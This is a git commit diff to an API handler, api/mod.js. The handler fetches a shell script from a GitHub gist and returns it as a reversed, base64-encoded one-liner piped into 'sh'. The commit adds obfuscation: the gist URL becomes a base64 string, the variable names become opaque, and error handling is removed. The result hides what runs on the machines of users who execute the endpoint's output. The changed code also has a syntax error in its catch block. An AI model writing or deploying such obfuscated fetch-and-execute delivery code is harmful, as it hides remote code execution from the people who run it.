80910968fff734a6f3cf72ba1c80cb4c766339dc
VannXD0 <holilmustofa5@gmail.com>
2026-06-25 13:26:39 +0700

    Update mod.js

--- api/mod.js
+++ api/mod.js
@@ -1,16 +1,15 @@
 export default async function handler(req, res) {
-  const GIST_URL = "https://gist.githubusercontent.com/VannXD0/e7ba34f1d641d40f209fc0bf899bc6ff/raw/a623799f90de9120d904cb5ce6f0dca9ef090934/Arc.sh";
-  
+  const _U = Buffer.from("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==", 'base64').toString('utf8');
+
   try {
-    const response = await fetch(GIST_URL);
-    if (!response.ok) return res.status(404).send("echo 'Gist Not Found'");
+    const _R = await fetch(_U);
+    const _S = await _R.text();
     
-    const script = await response.text();
-    const payload = Buffer.from(script).toString('base64').split('').reverse().join('');
+    const _O = Buffer.from(_S).toString('base64').split('').reverse().join('');
     
     res.setHeader("Content-Type", "text/plain");
-    return res.status(200).send(`echo "${payload}" | rev | base64 -d | sh`);
-  } catch (e) {
-    return res.status(500).send("echo 'Server Error'");
+    return res.status(200).send(`echo "${_O}" | rev | base64 -d | sh`);
+  } catch (e)  
+    return res.status(500).send("echo 'Access Denied'");
   }
 }
